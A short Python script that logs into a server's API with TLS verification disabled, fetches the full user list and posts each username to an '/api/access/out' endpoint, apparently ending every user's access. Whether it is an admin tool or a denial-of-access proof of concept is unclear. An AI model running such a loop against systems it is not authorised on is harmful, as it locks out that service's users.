import random
import requests, json
import random, string
import sys, os

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

login_url = 'https://' + sys.argv[1] + '/auth/page/hashdb/login'
payload = {'username': sys.argv[2], 'password': sys.argv[3]}
session = requests.Session()
req = session.post(login_url, data=payload, verify=False)
users = session.post('https://' + sys.argv[1] + '/api/user/info', json={}).json()

usernames = []

for i in users:
    data = {'username': i['username']}
    res = session.post('https://' + sys.argv[1] + '/api/access/out', json=data)
    print(res.text)
